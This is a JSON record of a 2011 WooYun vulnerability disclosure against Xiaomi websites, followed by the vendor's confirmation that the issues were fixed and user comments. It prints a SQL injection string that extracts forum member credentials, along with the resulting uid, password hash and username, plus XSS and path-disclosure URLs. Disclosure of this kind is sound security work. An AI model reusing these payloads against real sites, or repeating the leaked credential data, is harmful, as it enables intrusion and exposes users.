{"id": 21625, "wybug_id": "wooyun-2011-03467", "wybug_title": "小米科技网站漏洞全集", "wybug_corp": "小米科技", "wybug_author": "Jannock", "wybug_date": "2011-11-29 09:00", "wybug_open_date": "2011-12-29 09:01", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "反射型", "用户敏感信息泄漏", "字符类型注射", "错误信息未屏蔽", "路径信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-11-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-12-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-12-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-12-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-12-29：\t细节向公众公开  简要描述： 简单通过Google搜索了一下，发现多个大小问题。 详细说明：  1、米聊官方论坛二次注入。http://www.discuz.net/thread-2354532-1-1.html打补丁。2、跨站脚本http://mi.xiaomi.com/%E6%96%B9%E8%B6%85x%3Cscript%3Ealert%28/ss/%29%3C/script%3E/53、跨站脚本http://mi.xiaomi.com/info.php?i=1&u=%CB%D5%B9%DA%BB%AA%27&e=354111841%40qq.com%27%3Cscript%3Ealert%28/s/%29;%3C/script%3E4、程序出错暴路径http://blog.xiaomi.com/wp-content/themes/xiaomi/5、程序出错暴路径http://hd.xiaomi.com/index.php?action=rank&date=2011-11-13%27   漏洞证明：  1、x',`subject`=(/*!select*/ concat(uid,'|',password,'|',username) from pre_common_member where  groupid=1 limit 0,1),comment='4275|fd9d2eba79764c080a3c2f9d5ab7e4a7|麦兜在扫地2、略3、略4、Fatal error: Call to undefined function get_header() in /data/www/blog.xiaomi.com/wwwroot/wp-content/themes/xiaomi/index.php on line 7 5、Fatal error: Uncaught exception 'Exception' with message 'DateTime::__construct(): Failed to parse time string (2011-11-13\\') at position 10 (\\): Unexpected character' in /data/www/hd.xiaomi.com/action/rank.action.php:51 Stack trace: #0 /data/www/hd.xiaomi.com/action/rank.action.php(51): DateTime->__construct('2011-11-13\\'') #1 /data/www/hd.xiaomi.com/action/rank.action.php(40): rank->index() #2 /data/www/hd.xiaomi.com/action/rank.action.php(98): rank->init() #3 /data/www/hd.xiaomi.com/web/index.php(100): require('/data/www/hd.xi...') #4 {main} thrown in /data/www/hd.xiaomi.com/action/rank.action.php on line 51    修复方案：  您懂得！   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2011-11-29 10:01 厂商回复： 灰常灰常感谢您的报告，已经内部处理中！ 最新状态： 2011-11-29：第四项、第五项已经修复。其它ing 2011-11-29：所有上报问题已经全部fix，再次感谢filer  ", "replys": "漏洞评价：\n评论\n     2011-11-29 09:49 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  = = 牛擦 全集 够干货    \n     2011-11-29 14:44 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  打错字了，是合集，呵呵。。    \n     2011-11-29 18:34 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  这个好送手机了    \n     2011-12-29 10:42 |    \t\tSGKer \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 乌拉轼)\t\t \n  果断送手机啊    \n     2011-12-29 15:59 |    \t\ttpu01yzx \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:8        | test)\t\t \n  全集……求精华版。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}